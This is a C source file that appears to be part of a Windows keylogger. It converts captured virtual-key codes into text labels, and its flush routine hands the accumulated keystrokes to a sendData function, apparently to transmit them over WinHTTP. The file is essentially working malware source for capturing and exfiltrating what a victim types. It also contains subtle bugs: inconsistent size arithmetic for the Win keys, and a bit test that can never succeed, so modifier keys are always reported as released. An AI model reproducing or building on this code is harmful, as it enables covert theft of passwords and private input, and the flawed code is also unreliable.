#include "shared.h"

void getStrRepr(char* repr, size_t* size)
{
    if(size != NULL)
        *size = 0;

    size_t written = 0;
    for (size_t i = 0; i < BUFFSIZE; ++i)
    {
        if (Buffer[i] == 0x00)
            break;

        char* key = NULL;
        size_t keySize = 1;
        char helper[2] = { 0 };

        switch ( (unsigned char) Buffer[i])
        {
        case VK_BACK:
            key = "[BackSpace]";
            keySize = sizeof("[BackSpace]");
            break;

        case VK_TAB:
            key = "[Tab]";
            keySize = sizeof("[Tab]");
            break;

        case VK_CLEAR:
            key = "[Clear]";
            keySize = sizeof("[Clear]");
            break;

        case VK_RETURN:
            key = "[Return]";
            keySize = sizeof("[Return]");
            break;

            // Shift Key Handeling
        case VK_SHIFT:
            if (Buffer[i] & 0x100)
            {
                key = "[Shift Down]";
                keySize = sizeof("[Shift Down]");
            }
            else
            {
                key = "[Shift Up]";
                keySize = sizeof("[Shift Up]");
            }
            break;

        case VK_LSHIFT:
            if (Buffer[i] & 0x100)
            {
                key = "[LShift Down]";
                keySize = sizeof("[LShift Down]");
            }
            else
            {
                key = "[LShift Up]";
                keySize = sizeof("[LShift Up]");
            }
            break;

        case VK_RSHIFT:
            if (Buffer[i] & 0x100)
            {
                key = "[RShift Down]";
                keySize = sizeof("[RShift Down]");
            }
            else
            {
                key = "[RShift Up]";
                keySize = sizeof("[RShift Up]");
            }
            break;

            // Control Key Handeling
        case VK_CONTROL:
            if (Buffer[i] & 0x100)
            {
                key = "[Ctrl Down]";
                keySize = sizeof("[Ctrl Down]");
            }
            else
            {
                key = "[Ctrl Up]";
                keySize = sizeof("[Ctrl Up]");
            }
            break;

        case VK_LCONTROL:
            if (Buffer[i] & 0x100)
            {
                key = "[LCtrl Down]";
                keySize = sizeof("[LCtrl Down]");
            }
            else
            {
                key = "[LCtrl Up]";
                keySize = sizeof("[LCtrl Up]");
            }
            break;

        case VK_RCONTROL:
            if (Buffer[i] & 0x100)
            {
                key = "[RCtrl Down]";
                keySize = sizeof("[RCtrl Down]");
            }
            else
            {
                key = "[RCtrl Up]";
                keySize = sizeof("[RCtrl Up]");
            }
            break;

            // Alt Key Handeling
        case VK_MENU:
            if (Buffer[i] & 0x100)
            {
                key = "[Alt Down]";
                keySize = sizeof("[Alt Down]");
            }
            else
            {
                key = "[Alt Up]";
                keySize = sizeof("[Alt Up]");
            }
            break;

        case VK_LMENU:
            if (Buffer[i] & 0x100)
            {
                key = "[LAlt Down]";
                keySize = sizeof("[LAlt Down]");
            }
            else
            {
                key = "[LAlt Up]";
                keySize = sizeof("[LAlt Up]");
            }
            break;

        case VK_RMENU:
            if (Buffer[i] & 0x100)
            {
                key = "[RAlt Down]";
                keySize = sizeof("[RAlt Down]");
            }
            else
            {
                key = "[RAlt Up]";
                keySize = sizeof("[RAlt Up]");
            }
            break;

        case VK_PAUSE:
            key = "[Pause]";
            keySize = sizeof("[Pause]");
            break;

        case VK_CAPITAL:
            key = "[CapsLock]";
            keySize = sizeof("[CapsLock]");
            break;

        case VK_KANA:
            key = "[IME Kana/Hangul Mode]";
            keySize = sizeof("[IME Kana/Hangul Mode]");
            break;

        case VK_IME_ON:
            key = "[IME On]";
            keySize = sizeof("[IME On]");
            break;

        case VK_JUNJA:
            key = "[IME Junja Mode]";
            keySize = sizeof("[IME Junja Mode]");
            break;

        case VK_FINAL:
            key = "[IME Hanja Mode]";
            keySize = sizeof("[IME Hanja Mode]");
            break;

        case VK_HANJA:
            key = "[IME Hanja/Kanji Mode]";
            keySize = sizeof("[IME Hanja/Kanji Mode]");
            break;

        case VK_IME_OFF:
            key = "[IME Off]";
            keySize = sizeof("[IME Off]");
            break;

        case VK_ESCAPE:
            key = "[Esc]";
            keySize = sizeof("[Esc]");
            break;

        case VK_CONVERT:
            key = "[IME Convert]";
            keySize = sizeof("[IME Convert]");
            break;

        case VK_NONCONVERT:
            key = "[IME NonConvert]";
            keySize = sizeof("[IME NonConvert]");
            break;

        case VK_MODECHANGE:
            key = "[IME Mode Change Req]";
            keySize = sizeof("[IME Mode Change Req]");
            break;

        case VK_SPACE:
            key = "[Space]";
            keySize = sizeof("[Space]");
            break;

        case VK_PRIOR:
            key = "[PgUp]";
            keySize = sizeof("[PgUp]");
            break;

        case VK_NEXT:
            key = "[PgDn]";
            keySize = sizeof("[PgDn]");
            break;

        case VK_END:
            key = "[End]";
            keySize = sizeof("[End]");
            break;

        case VK_HOME:
            key = "[Home]";
            keySize = sizeof("[Home]");
            break;

        case VK_LEFT:
            key = "[ArrowKey Left]";
            keySize = sizeof("[ArrowKey Left]");
            break;

        case VK_RIGHT:
            key = "[ArrowKey Right]";
            keySize = sizeof("[ArrowKey Right]");
            break;

        case VK_UP:
            key = "[ArrowKey Up]";
            keySize = sizeof("[ArrowKey Up]");
            break;

        case VK_DOWN:
            key = "[ArrowKey Down]";
            keySize = sizeof("[ArrowKey Down]");
            break;

        case VK_SELECT:
            key = "[Select]";
            keySize = sizeof("[Select]");
            break;

        case VK_PRINT:
            key = "[Print]";
            keySize = sizeof("[Print]");
            break;

        case VK_EXECUTE:
            key = "[EXECUTE]";
            keySize = sizeof("[EXECUTE]");
            break;

        case VK_SNAPSHOT:
            key = "[PrtSc]";
            keySize = sizeof("[PrtSc]");
            break;

        case VK_INSERT:
            key = "[Insert]";
            keySize = sizeof("[Insert]");
            break;

        case VK_DELETE:
            key = "[Delete]";
            keySize = sizeof("[Delete]");
            break;

        case VK_HELP:
            key = "[Help]";
            keySize = sizeof("[Help]");
            break;

            // Win Key Handeling
        case VK_LWIN:
            if (Buffer[i] & 0x100)
            {
                key = "[LWin Down]";
                keySize += sizeof("[LWin Down]");
            }
            else
            {
                key = "[LWin Up]";
                keySize += sizeof("[LWin Up]");
            }
            break;

        case VK_RWIN:
            if (Buffer[i] & 0x100)
            {
                key = "[RWin Down]";
                keySize += sizeof("[RWin Down]");
            }
            else
            {
                key = "[RWin Up]";
                keySize += sizeof("[RWin Up]");
            }
            break;

        case VK_APPS:
            key = "[Menu]";
            keySize = sizeof("[Menu]");
            break;

        case VK_SLEEP:
            key = "[Sleep]";
            keySize = sizeof("[Sleep]");
            break;

            // Numpad Handeling
        case VK_NUMPAD0:
            key = "[Numpad0]";
            keySize = sizeof("[Numpad0]");
            break;
        case VK_NUMPAD1:
            key = "[Numpad1]";
            keySize = sizeof("[Numpad1]");
            break;
        case VK_NUMPAD2:
            key = "[Numpad2]";
            keySize = sizeof("[Numpad2]");
            break;
        case VK_NUMPAD3:
            key = "[Numpad3]";
            keySize = sizeof("[Numpad3]");
            break;
        case VK_NUMPAD4:
            key = "[Numpad4]";
            keySize = sizeof("[Numpad4]");
            break;
        case VK_NUMPAD5:
            key = "[Numpad5]";
            keySize = sizeof("[Numpad5]");
            break;
        case VK_NUMPAD6:
            key = "[Numpad6]";
            keySize = sizeof("[Numpad6]");
            break;
        case VK_NUMPAD7:
            key = "[Numpad7]";
            keySize = sizeof("[Numpad7]");
            break;
        case VK_NUMPAD8:
            key = "[Numpad8]";
            keySize = sizeof("[Numpad8]");
            break;
        case VK_NUMPAD9:
            key = "[Numpad9]";
            keySize = sizeof("[Numpad9]");
            break;
        case VK_MULTIPLY:
            key = "*";
            keySize = sizeof("*");
            break;
        case VK_ADD:
            key = "+";
            keySize = sizeof("+");
            break;
        case VK_SEPARATOR:
            key = "[Sep]";
            keySize = sizeof("[Sep]");
            break;
        case VK_SUBTRACT:
            key = "-";
            keySize = sizeof("-");
            break;
        case VK_DECIMAL:
            key = ".";
            keySize = sizeof(".");
            break;
        case VK_DIVIDE:
            key = "/";
            keySize = sizeof("/");
            break;

            // Handle Fs
        case VK_F1:
            key = "[F1]";
            keySize = sizeof("[F1]");
            break;
        case VK_F2:
            key = "[F2]";
            keySize = sizeof("[F2]");
            break;
        case VK_F3:
            key = "[F3]";
            keySize = sizeof("[F3]");
            break;
        case VK_F4:
            key = "[F4]";
            keySize = sizeof("[F4]");
            break;
        case VK_F5:
            key = "[F5]";
            keySize = sizeof("[F5]");
            break;
        case VK_F6:
            key = "[F6]";
            keySize = sizeof("[F6]");
            break;
        case VK_F7:
            key = "[F7]";
            keySize = sizeof("[F7]");
            break;
        case VK_F8:
            key = "[F8]";
            keySize = sizeof("[F8]");
            break;
        case VK_F9:
            key = "[F9]";
            keySize = sizeof("[F9]");
            break;
        case VK_F10:
            key = "[F10]";
            keySize = sizeof("[F10]");
            break;
        case VK_F11:
            key = "[F11]";
            keySize = sizeof("[F11]");
            break;
        case VK_F12:
            key = "[F12]";
            keySize = sizeof("[F12]");
            break;
        case VK_F13:
            key = "[F13]";
            keySize = sizeof("[F13]");
            break;
        case VK_F14:
            key = "[F14]";
            keySize = sizeof("[F14]");
            break;
        case VK_F15:
            key = "[F15]";
            keySize = sizeof("[F15]");
            break;
        case VK_F16:
            key = "[F16]";
            keySize = sizeof("[F16]");
            break;
        case VK_F17:
            key = "[F17]";
            keySize = sizeof("[F17]");
            break;
        case VK_F18:
            key = "[F18]";
            keySize = sizeof("[F18]");
            break;
        case VK_F19:
            key = "[F19]";
            keySize = sizeof("[F19]");
            break;
        case VK_F20:
            key = "[F20]";
            keySize = sizeof("[F20]");
            break;
        case VK_F21:
            key = "[F21]";
            keySize = sizeof("[F21]");
            break;
        case VK_F22:
            key = "[F22]";
            keySize = sizeof("[F22]");
            break;
        case VK_F23:
            key = "[F23]";
            keySize = sizeof("[F23]");
            break;
        case VK_F24:
            key = "[F24]";
            keySize = sizeof("[F24]");
            break;

        case VK_NUMLOCK:
            key = "[Numlock]";
            keySize = sizeof("[Numlock]");
            break;

        case VK_SCROLL:
            key = "[Scroll]";
            keySize = sizeof("[Scroll]");
            break;

        case VK_BROWSER_BACK:
            key = "[BrowserBack]";
            keySize = sizeof("[BrowserBack]");
            break;

        case VK_BROWSER_FORWARD:
            key = "[BrowserForward]";
            keySize = sizeof("[BrowserForward]");
            break;

        case VK_BROWSER_REFRESH:
            key = "[BrowserRefresh]";
            keySize = sizeof("[BrowserRefresh]");
            break;

        case VK_BROWSER_STOP:
            key = "[BrowserStop]";
            keySize = sizeof("[BrowserStop]");
            break;

        case VK_BROWSER_SEARCH:
            key = "[BrowserSearch]";
            keySize = sizeof("[BrowserSearch]");
            break;

        case VK_BROWSER_FAVORITES:
            key = "[BrowserFavorites]";
            keySize = sizeof("[BrowserFavorites]");
            break;

        case VK_BROWSER_HOME:
            key = "[BrowserHome]";
            keySize = sizeof("[BrowserHome]");
            break;

        case VK_VOLUME_MUTE:
            key = "[VolumeMute]";
            keySize = sizeof("[VolumeMute]");
            break;

        case VK_VOLUME_DOWN:
            key = "[VolumeDown]";
            keySize = sizeof("[VolumeDown]");
            break;

        case VK_VOLUME_UP:
            key = "[VolumeUp]";
            keySize = sizeof("[VolumeUp]");
            break;

        case VK_MEDIA_NEXT_TRACK:
            key = "[NextTrack]";
            keySize = sizeof("[NextTrack]");
            break;

        case VK_MEDIA_PREV_TRACK:
            key = "[PrevTrack]";
            keySize = sizeof("[PrevTrack]");
            break;

        case VK_MEDIA_STOP:
            key = "[StopMedia]";
            keySize = sizeof("[StopMedia]");
            break;

        case VK_MEDIA_PLAY_PAUSE:
            key = "[(Play/Pause)Media]";
            keySize = sizeof("[(Play/Pause)Media]");
            break;

        case VK_LAUNCH_MAIL:
            key = "[LaunchMail]";
            keySize = sizeof("[LaunchMail]");
            break;

        case VK_LAUNCH_MEDIA_SELECT:
            key = "[SelectMedia]";
            keySize = sizeof("[SelectMedia]");
            break;

        case VK_LAUNCH_APP1:
            key = "[LaunchApp1]";
            keySize = sizeof("[LaunchApp1]");
            break;

        case VK_LAUNCH_APP2:
            key = "[LaunchApp2]";
            keySize = sizeof("[LaunchApp2]");
            break;

        case VK_OEM_1:
            key = ";";
            keySize = sizeof(";");
            break;

        case VK_OEM_PLUS:
            key = "=";
            keySize = sizeof("=");
            break;

        case VK_OEM_COMMA:
            key = ",";
            keySize = sizeof(",");
            break;

        case VK_OEM_MINUS:
            key = "-";
            keySize = sizeof("-");
            break;

        case VK_OEM_PERIOD:
            key = ".";
            keySize = sizeof(".");
            break;

        case VK_OEM_2:
            key = "/";
            keySize = sizeof("/");
            break;

        case VK_OEM_3:
            key = "`";
            keySize = sizeof("`");
            break;

        case VK_OEM_4:
            key = "[";
            keySize = sizeof("[");
            break;

        case VK_OEM_5:
            key = "\\";
            keySize = sizeof("\\");
            break;

        case VK_OEM_6:
            key = "]";
            keySize = sizeof("]");
            break;

        case VK_OEM_7:
            key = "'";
            keySize = sizeof("'");
            break;

        case VK_OEM_8:
            key = "[Unknown]";
            keySize = sizeof("[Unknown]");
            break;

        case VK_OEM_102:
            key = "[<>|]";
            keySize = sizeof("[<>|]");
            break;

        case VK_PROCESSKEY:
            key = "[IME Process]";
            keySize = sizeof("[IME Process]");
            break;

        case VK_ATTN:
            key = "[Attn]";
            keySize = sizeof("[Attn]");
            break;

        case VK_CRSEL:
            key = "[CrSel]";
            keySize = sizeof("[CrSel]");
            break;

        case VK_EXSEL:
            key = "[ExSel]";
            keySize = sizeof("[ExSel]");
            break;

        case VK_EREOF:
            key = "[Erase EOF]";
            keySize = sizeof("[Erase EOF]");
            break;

        case VK_PLAY:
            key = "[Play]";
            keySize = sizeof("[Play]");
            break;

        case VK_ZOOM:
            key = "[Zoom]";
            keySize = sizeof("[Zoom]");
            break;

        case VK_PA1:
            key = "[PA1]";
            keySize = sizeof("[PA1]");
            break;

        case VK_OEM_CLEAR:
            key = "[Clear]";
            keySize = sizeof("[Clear]");
            break;
        
        default:
            helper[0] = (char) Buffer[i];
            helper[1] = 0x00;
            key = helper;
            keySize = 2;
            break;
        }

        if (size != NULL)
            *size += keySize;
        
        if (repr != NULL)
        {
            memcpy(repr + written, key, keySize-1);
            written += keySize;
            repr[written - 1] = ' ';
        }
    }
    if (size != NULL)
        (*size)++;
    if(repr != NULL)
        repr[written] = 0x00;

}

// Flushing function, basically pushing data to somewhere and empty the Buffer.
void flush()
{
    size_t size;
    getStrRepr(NULL, &size);
    if (!size)
        return;
    char* strRepr = malloc(size);
    getStrRepr(strRepr, NULL);
#ifdef DEBUG
    printf("%s\n", strRepr);
#endif
    sendData(strRepr, size);
    free(strRepr);
    Index = 0;
    for (size_t i = 0; i < BUFFSIZE; ++i)
        Buffer[i] = 0x00;
}


// Handeling errors to get string representation of them in Debug build.
#ifdef DEBUG
void handleError(LPCTSTR funcName)
{
    LPVOID msg;
    DWORD err = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_FROM_HMODULE |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        GetModuleHandle("winhttp.dll"),
        err,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&msg,
        0, NULL);

    fprintf(stderr, "%s Failed With code: %d and Error: %s", funcName, err, (char*)msg);

    LocalFree(msg);
}
#endif